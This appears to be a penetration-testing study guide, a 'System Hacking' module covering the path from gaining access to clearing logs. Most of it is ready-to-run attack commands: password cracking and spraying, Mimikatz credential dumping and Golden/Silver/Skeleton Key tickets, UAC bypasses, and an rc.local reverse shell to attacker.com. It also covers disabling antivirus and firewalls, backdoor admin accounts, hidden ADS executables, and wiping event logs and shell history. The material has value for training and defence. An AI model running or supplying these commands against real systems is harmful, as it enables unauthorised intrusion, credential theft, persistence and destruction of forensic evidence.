# Module 06 – System Hacking

> Status: ✅ Reference complete

## 1. Goal
Gain unauthorized access to a system, escalate privileges, maintain access, and clear tracks. Four phases: **Gaining Access → Escalating Privileges → Maintaining Access → Clearing Logs**. Placeholders: `<target>`, `<target_ip>`, `<DC-IP>`, `<domain>`.

---

# PHASE 1 — Gaining Access

## 2. Cracking passwords
**Windows auth mechanisms:**
- **SAM database** — stores local usernames + LM/NTLM hashed passwords at `%SystemRoot%\system32\config\SAM`, mounted in registry under `HKLM\SAM`.
- **NTLM** — older challenge-response auth; proves identity without sending the password; weaker.
- **Kerberos** — modern, ticket-based, trusted third party (KDC); default in most Windows domains.

**Hash-extraction tools** (need admin on the target): **pwdump7** (dumps LM/NTLM from SAM, can dump protected files offline), Mimikatz, DSInternals, hashcat, PyCrack.

### Password-attack taxonomy
- **Non-electronic** — social engineering, shoulder surfing, dumpster diving.
- **Active online** — real-time login attempts: dictionary, brute-force, rule-based, hybrid, syllable, password spraying, mask; also trojans/keyloggers, hash injection/**Pass-the-Hash**, LLMNR/NBT-NS poisoning, Internal Monologue, Kerberos cracking, NTLM relay; combinator, fingerprint, Markov-chain, GPU-based.
- **Passive online** — wire sniffing, MITM/replay.
- **Offline** — steal hashes and crack locally: rainbow tables, distributed network attack.

### John the Ripper
```bash
john --wordlist=rockyou.txt hash.txt              # dictionary
john --show hash.txt                              # show cracked
john --format=raw-md5 --wordlist=rockyou.txt hash.txt   # specific format
john --rules --wordlist=rockyou.txt hash.txt      # mangling rules
john --incremental hash.txt                       # brute-force (no wordlist)
john --mask=?l?l?l?l?l hash.txt                   # mask (5 lowercase)
john --fork=4 --wordlist=rockyou.txt hash.txt     # 4 cores
john --session=mysession --wordlist=rockyou.txt hash.txt   # named session
john --restore=mysession                          # resume
john --format=NT hash.txt --wordlist=rockyou.txt  # NTLM
john --list=formats                               # list formats
```

### Hydra (network brute-force / password spraying)
```bash
hydra -l admin -P passwords.txt ftp://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
hydra -l admin -P passwords.txt http-get://192.168.1.100/login
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100   # non-default port
hydra -L users.txt -p 123456 rdp://192.168.1.100              # fixed password
hydra -L users.txt -P passwords.txt smb://192.168.1.100
hydra -C creds.txt ssh://192.168.1.100                        # user:pass combo file
hydra -V -l admin -P passwords.txt ssh://192.168.1.100        # verbose
hydra -t 4 -L users.txt -P passwords.txt ssh://192.168.1.100  # 4 threads
hydra -f -l admin -P passwords.txt ftp://192.168.1.100        # stop at first hit
hydra -x 6:8:a ssh://192.168.1.100 -l root                    # generated 6-8 lowercase
```
Spraying tools: thc-hydra, Metasploit, Rubeus, adfsbrute, CrackMapExec.

### Hashcat
Charsets: `?l` lower · `?u` upper · `?d` digit · `?h`/`?H` hex · `?s` special · `?a` = `?l?u?d?s` · `?b` 0x00-0xff. Custom: `-1 ?l?d` etc. Hash modes: `-m 0` MD5, `-m 1000` NTLM, `-m 1800` sha512crypt (Linux shadow), `-m 22000` WPA/WPA2. Attack modes: `-a 0` straight, `-a 1` combo, `-a 3` brute/mask, `-a 6` hybrid.
```bash
hashcat -a 3 -m 0 hashes.txt ?l?l?l?d?d?d                 # abc123 pattern
hashcat -a 3 -m 0 -1 ?l?u hashes.txt ?1?1?1?1?1?1?1?1     # custom charset
hashcat -a 3 -m 0 -i --increment-min=6 --increment-max=10 <hash> ?l?d   # unknown length
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt                # NTLM dictionary
hashcat -m 0 -a 0 -r rules/best64.rule hash.txt wordlist.txt   # rules
hashcat -m 0 -a 6 hash.txt wordlist.txt wordlist.txt     # hybrid
hashcat -m 0 -a 0 -O -w 3 hash.txt rockyou.txt           # optimized, high workload
hashcat -m 22000 -a 3 wifi.hc22000 ?d?d?d?d?d?d?d?d       # 8-digit WPA
hashcat --example-hashes                                 # sample hashes
```

### LLMNR/NBT-NS poisoning
Attacker answers LLMNR/NBT-NS broadcasts (after a victim's DNS lookup fails), poses as the requested host, the victim sends its **NTLMv2 hash**, attacker captures and cracks it offline. Tool: **Responder** (`./Responder -I eth0`), Metasploit, Inveigh. Detection: Vindicate, got-responded, Respounder.

### Internal Monologue Attack
Downgrade NTLM (`LMCompatibilityLevel`) to force NetNTLMv1, grab tokens from running processes, use NTLM SSP to get NetNTLMv1 responses per user, restore settings, crack offline (rainbow tables). Gets NTLM hashes **without touching LSASS** — works where Mimikatz doesn't.

### Cracking Kerberos
- **AS-REP Roasting (TGT)** — target accounts with pre-auth disabled; request AS-REP (encrypted with the user's password hash), crack offline.
- **Kerberoasting (TGS)** — authenticate with a normal account → get TGT → request TGS for service accounts (encrypted with service account hash) → extract from memory with **Rubeus** → crack with hashcat/John.
- **Pass-the-Ticket** — dump TGT/ST from memory and reuse. **Silver Ticket** = one service; **Golden Ticket** = any user (made from KRBTGT hash). Tools: Mimikatz, Rubeus, Windows Credentials Editor.
- **NTLM Relay** — Responder poisons LLMNR/NBT-NS/mDNS; `impacket-ntlmrelayx.py -of <SAM-dump> -tf <targets> -smb2support` relays captured NTLM to an SMB target and dumps LM/NTLM hashes.

**Password salting** adds a random string before hashing → defeats precomputed hash lists. Recovery/cracking tools: Elcomsoft, Passware Kit Forensic, PCUnlocker, Lazesoft, L0phtCrack, RainbowCrack (`rtgen`), hashID, Patator, BruteX.

## 3. Vulnerability exploitation
Steps: identify vuln (Exploit-DB/Packet Storm) → determine risk → determine capability → develop/obtain exploit (Metasploit) → choose delivery (remote/local) → generate + deliver payload → gain remote shell. A **PoC** proves a vuln is real; released before patch → zero-day risk.

**Exploit sites:** Exploit-DB, VulDB, OSV, MITRE CVE.

### WES-NG (Windows Exploit Suggester – Next Gen)
```bash
systeminfo > systeminfo.txt            # local; systeminfo /S <target> for remote
git clone https://github.com/bitsadmin/wesng.git && cd wesng
python wes.py --update                 # download MS security update catalog
python wes.py systeminfo.txt           # analyze
python wes.py -e systeminfo.txt        # vulns + available exploits
python wes.py systeminfo.txt --exploits --elevate --output privesc_results.txt
```

### Metasploit Framework
Libraries: **Framework-Core** (component comms, sessions, plugins), **Framework-Base** (tracking/DB), **Rex** (networking/encoding helpers). Interfaces: **msfconsole**, **msfvenom** (payload+encoder → shellcode/exe), **msfrpc/msfrpcd**, **Armitage** (GUI). Modules: Auxiliary, Encoders, Evasion, Exploits, NOPs, Payloads, Post.
```text
# Evasion modules
evasion/windows/windows_defender_exe     # bypass Defender
evasion/windows/antivirus_disable        # disable AV (Windows)
evasion/unix/antivirus_disable           # disable AV (Unix)
# Post-exploitation modules
post/windows/gather/enum_logged_on_users
post/windows/gather/credentials/credential_collector
post/linux/gather/enum_configs
post/linux/gather/hashdump
post/multi/manage/autoroute              # route into target subnet
post/windows/manage/portproxy            # port-forward for pivoting
```
AI exploitation: Nebula, DeepExploit (A3C deep-learning auto-exploit).

### Buffer overflow
Too much data into a buffer overwrites adjacent memory → control of execution. Stack registers: **EBP** (base), **ESP** (stack pointer), **EIP** (instruction pointer — overwrite target), **ESI/EDI** (source/dest index). **Stack-based** overwrites EIP to jump to injected shellcode; **heap-based** corrupts dynamic-memory pointers/structures (harder to predict). Detection tools: OllyDbg, Veracode, Flawfinder, Kiuwan, Splint, Valgrind.

### AD domain mapping & enumeration
- **BloodHound** (Neo4j graph) — maps AD users/computers/groups/trusts and attack paths.
- **PowerView** (PowerShell) — AD enumeration. First: `Set-MpPreference -DisableRealtimeMonitoring $true`.

| Target | Commands |
|--------|----------|
| Domain | `Get-NetDomain` · `Get-DomainSID` |
| Domain policy | `Get-DomainPolicy` · `(Get-DomainPolicy)."kerberospolicy"` |
| DCs | `Get-NetDomainController` |
| Users | `Get-NetUser` · `Get-UserProperty -Properties pwdlastset` · `Find-LocalAdminAccess` · `Get-NetSession -ComputerName <c>` |
| Computers | `Get-NetComputer` · `Get-NetComputer -OperatingSystem "*Server 2022*"` · `Get-NetComputer -Ping` |
| Groups | `Get-NetGroup` · `Get-NetGroupMember -GroupName "Domain Admins"` · `Get-NetLocalGroup -ComputerName <c>` |
| Shares | `Invoke-ShareFinder -Verbose` · `Get-NetShare` · `Find-DomainShare` · `Invoke-FileFinder` |
| GPO/OUs | `Get-NetGPO` · `Get-NetOU` |
| ACLs | `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs` · `Invoke-ACLScanner -ResolveGUIDs` |
| Trusts/forests | `Get-NetForest` · `Get-NetForestDomain` · `Get-NetForestCatalog` |

Also: linWinPwn. **GhostPack Seatbelt** (C# host-survey safety checks) — groups All/User/System/Slack/Chromium/Remote/Misc: `Seatbelt.exe -group=all`, `-group=system`, `Seatbelt.exe <command> -computername=HOST -username=DOMAIN\USER -password=PW`.

---

# PHASE 2 — Escalating Privileges

## 4. Privilege escalation
**Types:** *horizontal* (access another same-level user's data), *vertical* (gain higher/admin rights).

**Techniques:**
- **DLL hijacking** — program loads a planted malicious DLL from its own folder (no full path specified). Tools: Spartacus, DLLirant, ImpulsiveDLLHijack, PowerSploit.
- **Dylib hijacking (macOS)** — planted malicious dylib in a search path. Tool: Dylib Hijack Scanner.
- **Spectre & Meltdown** — CPU speculative-execution flaws leak memory (passwords/keys).
- **Named Pipe Impersonation** — low-priv pipe server waits for a high-priv client, then impersonates it; MSF `getsystem`.
- **Misconfigured services:** *unquoted service paths* (spaces + no quotes → plant exe in a parent path), *service object permissions* (replace service binary), *unattended installs* (`Unattend.xml` in `C:\Windows\Panther\`, `System32\sysprep\` — plaintext creds).
- **UAC bypass** (Metasploit — set SESSION/PAYLOAD/LHOST then exploit):

| Module | Method |
|--------|--------|
| `exploit/windows/local/bypassuac` | process injection |
| `.../bypassuac_injection` | reflective DLL injection (in-memory) |
| `.../bypassuac_fodhelper` | registry + fodhelper.exe |
| `.../bypassuac_eventvwr` | registry + eventvwr.exe |
| `.../bypassuac_comhijack` | COM handler DLL hijack |

- **Boot/logon scripts:**
```powershell
# Windows logon script (registry)
Set-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value "C:\malicious_script.bat"
# macOS login hook
sudo defaults write com.apple.loginwindow LoginHook /Users/attacker/malicious.sh
# Linux rc.local
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" | sudo tee -a /etc/rc.local ; sudo chmod +x /etc/rc.local
```
- **Domain policy modification** — edit `ScheduledTasks.xml` / `GptTmpl.inf` in SYSVOL `Policies\`; `nltest /domain_trusts` to map trusts.
- **DCSync** — with replication rights, impersonate a DC and pull hashes: `mimikatz "lsadump::dcsync /domain:<domain> /user:Administrator"`. 8 stages ending in domain admin creds.
- **ADCS abuse (Certipy):**
```bash
certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.10.10.1 -vulnerable -enabled
grep ESC1 domain.local_*.txt
certipy req -u 'user@domain.local' -p 'Password123' -dc-ip 10.10.10.1 -target 'domain.local' -ca 'corp-CA' -template 'VulnerableTemplate' -upn 'administrator@domain.local'
```

**NFS privesc:** `showmount -e <target>` → mount share → drop SUID `/bin/bash` → `ssh` in and run it.

**Pivoting (Metasploit):**
```text
run post/windows/gather/arp_scanner RHOSTS=10.10.10.0/24
background
route add 10.10.10.0 255.255.255.0 1
use auxiliary/scanner/portscan/tcp ; set RHOSTS 10.10.10.5,10.10.10.6 ; set PORTS 1-1000 ; run
use exploit/windows/local/bypassuac ; set SESSION 2 ; run
```
**Relaying (port-forward):**
```bash
portfwd -l 10080 -p 80 -r <target>     # -l local port, -p target port, -r target IP
curl http://localhost:10080
ssh myadmin@localhost -p 10022
```

**Other techniques:** access-token manipulation, parent PID spoofing, application shimming, filesystem-permission weakness, path interception, **accessibility feature abuse** (replace `sethc.exe`/`osk.exe`/`Magnify.exe`/`Narrator.exe` in System32), SID-history injection, COM hijacking, scheduled tasks (Windows `schtasks` / Linux cron — `crontab -e`/`-l`/`-r`), launch daemon & plist mod (macOS), setuid/setgid, web shell, sudo abuse, SUID/SGID abuse, kernel exploits, `.` in PATH, ptrace injection, MSI repair abuse, NoFilter (WFP token theft).

**Privesc tools:** BeRoot, pwncat (`escalate list`/`escalate run`), PowerSploit, Traitor, PEASS-ng (winPEAS/linPEAS), FullPowers, linpostexp, WES-NG.

---

# PHASE 3 — Maintaining Access

## 5. Executing applications
Malicious programs: backdoors, crackers, keyloggers, spyware. **RCE techniques:** client-execution exploits (browser/Office/3rd-party apps), service execution, **WMI** (ports 135/5985/5986), **WinRM** (remote mgmt abuse, lateral movement). Tools: Dameware, Pupy, PDQ Deploy, ManageEngine Endpoint Central, **PsExec**.

### Keyloggers
**Hardware:** PC/BIOS-embedded, keylogger keyboard, external (PS/2+USB, acoustic/CAM, Bluetooth, Wi-Fi). **Software:** application, kernel/rootkit/device-driver, hypervisor-based, form-grabbing, JavaScript-based, memory-injection.
```text
# Metasploit keylogger (Meterpreter)
ps ; getpid ; migrate <explorer_PID>
keyscan_start ; keyscan_dump ; keyscan_stop
# or: post/windows/capture/lockout_keylogger
```
Anti-keyloggers: Zemana AntiLogger, GuardedID, KeyScrambler, Oxynger KeyShield, SpyShelter.

### Spyware
Secret monitoring software; spreads via piggybacking, drive-by downloads, fake tools. Types: desktop, email, internet, child-monitoring, screen-capturing, USB, audio, video, print, telephone/cellphone (mSpy, XNSPY), GPS (SPYERA, MobiStealth). Anti-spyware: SUPERAntiSpyware, Malwarebytes, Avast One.

## 6. Hiding files
### Rootkits
Malware giving hidden root control. **Types:** hypervisor-level, hardware/firmware, kernel-level, boot-loader, application-level, library-level, memory. **Works via:** system hooking, inline hooking (kernel32.dll/ntdll.dll), DKOM (Direct Kernel Object Manipulation). **Detection methods:** integrity-based, signature-based, heuristic/behavior, runtime-path profiling, cross-view, alternative trusted medium, memory-dump, virtualization. Manual detection = dir listing/registry export on infected vs clean-boot, compare with WinMerge. Anti-rootkits: GMER, Stinger, TDSSKiller, Malwarebytes Anti-Rootkit.

### NTFS Alternate Data Streams (ADS)
Hide data in a stream attached to a file without changing its visible size.
```text
type C:\Trojan.exe > C:\Readme.txt:Trojan.exe     # hide exe in a stream
mklink backdoor.exe Readme.txt:Trojan.exe          # link to the stream
backdoor.exe                                       # run the hidden exe
notepad myfile.txt:lion.txt                        # create/view a text stream
```
Detectors: Stream Armor, Stream Detector, GMER, ADS Scanner, Streams, AlternateStreamView.

### Steganography
Hide the message itself inside a carrier. **Classes:** technical (invisible ink, microdots, computer-based: substitution, transform-domain, spread-spectrum, statistical, distortion, cover-generation) and linguistic (semagrams, open/jargon/covered/null/grille codes). **By medium:** image, document, folder, video, audio, whitespace, web, spam/email, natural-text, hidden-OS, C++ source, compressed.
- **LSB insertion** — hide bits in the least-significant bit of each RGB value (invisible to the eye).
- Masking/filtering, DCT/FFT/wavelet transform-domain (JPEG), echo hiding, spread spectrum (DSSS/FHSS), tone insertion, phase encoding (audio).
- **Whitespace (Snow):** `snow -C -p MyPassword -f secret.txt cover.txt output.txt` / `snow -C -p MyPassword output.txt`.
- Tools: OpenStego, StegOnline, DeepSound (audio), MP3Stego, OmniHide Pro (video), Spam Mimic (email).

**Steganalysis** — detect + distort hidden data. Attacks: stego-only, known-stego, known-message, known-cover, chosen-message, chosen-stego, chi-square, distinguishing statistical, blind classifier. Tools: zsteg, StegoVeritas, Stegextract, StegoHunt, Steganography Studio, VSL.

## 7. Establishing persistence
- **Sticky Keys** — replace `sethc.exe` with `cmd.exe`; Shift×5 at login → SYSTEM cmd. MSF `sticky_keys` module.
- **Boot/logon autostart** — Registry Run keys / Startup folder; check perms with winPEAS, `icacls`, `accesschk.exe`, then drop payload.

### Domain dominance
```text
# RCE backdoor admin
wmic /node:<DC> process call create "net user /add PiratedProcess Du^^Y01"
PsExec.exe \\<DC> -accepteula net localgroup "Admins" PiratedProcess /add
```
```text
# DPAPI abuse (mimikatz)
dpapi::masterkey /in:"...\Protect\<SID>\<GUID>" /sid:<SID> /password:<PW> /protected
sekurlsa::dpapi
lsadump::backupkeys /system:dc01.offense.local /export
```
```powershell
# Malicious replication (DCSync krbtgt)
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:target.local /user:krbtgt"'
# Skeleton Key (master backdoor password in LSASS)
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```
```text
# Golden Ticket (any user, from KRBTGT hash)
whoami /user
mimikatz # lsadump::dcsync /domain:example.com /user:krbtgt
mimikatz # kerberos::golden /domain:example.com /sid:<SID> /rc4:<KRBTGT_hash> /id:500 /user:Administrator
# Silver Ticket (one service, from service NTLM hash)
mimikatz # kerberos::golden /user:<svc_user> /domain:<domain> /sid:<SID> /rc4:<NTLM_hash> /service:<svc> /target:<FQDN> /ticket:ticket.kirbi
mimikatz # kerberos::ptt ticket.kirbi
# Overpass-the-Hash (hash/AES key → TGT)
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
```powershell
# AdminSDHolder persistence (SDProp re-applies hourly)
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Rights All
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
net group "Domain Admins" Martin /add /domain
```
```text
# WMI event subscription persistence
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="X", ExecutablePath="C:\...\x.exe", CommandLineTemplate="C:\...\x.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter=... Consumer=...
# or PowerLurk: Register-MaliciousWmiEvent -EventName L -PermanentCommand "x.exe" -Trigger UserLogon -Username any
```

## 8. Post-exploitation command reference
**Linux:**
```bash
find / -perm -3000 -ls 2>/dev/null                 # SUID binaries
find / -type f -perm -o=w -ls 2>/dev/null          # world-writable files
sudo -l                                            # permitted sudo commands
ps -ef ; mount ; route -n ; /sbin/ifconfig -a
cat /etc/crontab ; cat /etc/*release ; ls /etc/rc*
egrep -e '/bin/(ba)?sh' /etc/passwd                # users with shell access
```
**Windows:**
```text
dir /a:h                                           # hidden files
Get-FileHash <file> -a md5                         # hashing
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # 1 = privesc
schtasks /query /fo LIST /v ; tasklist /SVC
wmic service get name,displayname,pathname,startmode
wmic useraccount get name,sid
net view ; net share ; route print ; arp -a ; ipconfig /all ; getmac
netsh advfirewall set allprofiles state off        # kill firewall
psexec -i \\<Remote> cmd ; psexec -i -d -s c:\windows\regedit.exe
use exploit/windows/local/ps_wmi_exec              # authenticated WMI exec (MSF)
```

---

# PHASE 4 — Clearing Logs / Covering Tracks

## 9. Covering tracks
Delete/alter logs (`SECEVENT.EVT` security, `SYSEVENT.EVT` system, `APPEVENT.EVT` apps), restore file attributes/timestamps, disable future logging. **Techniques:** disabling auditing, clearing/manipulating logs, network evasion, hiding in OS, secure deletion, disabling Windows features, hiding artifacts.

### Disable auditing & clear logs
```text
auditpol /get /category:*                                                     # view policy
auditpol /set /category:"system","account logon" /success:disable /failure:disable
clearev                                                                        # Meterpreter — wipe event logs
wevtutil el ; wevtutil cl System ; wevtutil cl Application ; wevtutil cl Security
```
```powershell
Clear-EventLog "Windows PowerShell"
Clear-EventLog -LogName Application, System -Confirm
```
Also: `Clear_Event_Viewer_Logs.bat`. Manual — Event Viewer (Windows) / `/var/log/*.log` (Linux).

### Bash history
```bash
export HISTSIZE=0 ; history -c ; history -w
cat /dev/null > ~/.bash_history && history -c && exit
shred ~/.bash_history
```

### Network covering
Reverse HTTP shells (traffic looks like browsing), reverse ICMP tunnels (TCP in ping packets), DNS tunneling (data in DNS queries — covert backchannel), TCP parameter hiding (IP ID field, TCP ACK number via bounce server, TCP ISN).

### OS covering
```text
# NTFS ADS (see §6) + timestomp
timestomp C:\LegitFile.txt -z "01/01/2020 12:00:00"
powershell -Command "(Get-Item 'C:\LegitFile.txt').LastWriteTime = $(Get-Date).AddHours(-10)"
# Secure delete (3-pass overwrite)
cipher /w:<drive>:\<folder>
```
```bash
# Linux timestamps + hidden files
touch -a -d '2024-12-31 23:59:59' secret.txt       # access time
touch -m -d '2023-01-01 00:00:00' secret.txt       # modification time
mv file .file                                      # dot-hide
```

### Disable Windows features (anti-forensics)
```text
fsutil behavior set disablelastaccess 1            # no last-access timestamps
powercfg.exe /hibernate off                         # wipe hiberfil.sys (RAM snapshot)
```
Also via GUI/registry: disable virtual memory (paging file), system restore points, thumbnail cache (gpedit), Prefetch (SysMain service), delete Windows Activity History, flush DNS (`ipconfig /flushdns`) to clear incognito traces.

### Hiding artifacts
```text
# Windows
attrib +h +s +r <FolderName>                       # hide file/folder
net user stealthuser MySecure@123 /add ; net user stealthuser /active:no   # hidden user
# + Winlogon\SpecialAccounts registry to hide from login
```
```bash
# Linux: mv file .file ; mkdir .hidden
# macOS
defaults write com.apple.finder AppleShowAllFiles FALSE ; killall Finder
chflags hidden /Users/username/Desktop/secret.txt
```

### Anti-forensics & tools
Data/file deletion, password protection, steganography, data hiding in FS structures ($BadClus/HPA/slack space), trail obfuscation, artifact wiping, overwriting data, program packers, minimizing footprints (Live OS/VMs), access anonymization (Tor/proxies). Track-covering tools: CCleaner, DBAN, Privacy Eraser, Wipe, BleachBit, east-tec Eraser.

> Full chain: crack/relay creds or exploit a vuln to get a shell → escalate (UAC bypass / misconfig / DCSync / token abuse) → maintain (keylogger, rootkit/ADS, Golden/Silver ticket, WMI persistence) → clear tracks (auditpol, clearev/wevtutil, bash history, timestomp, cipher, disable forensic features). Log every artifact for the report; clearing logs is the client's call per RoE.
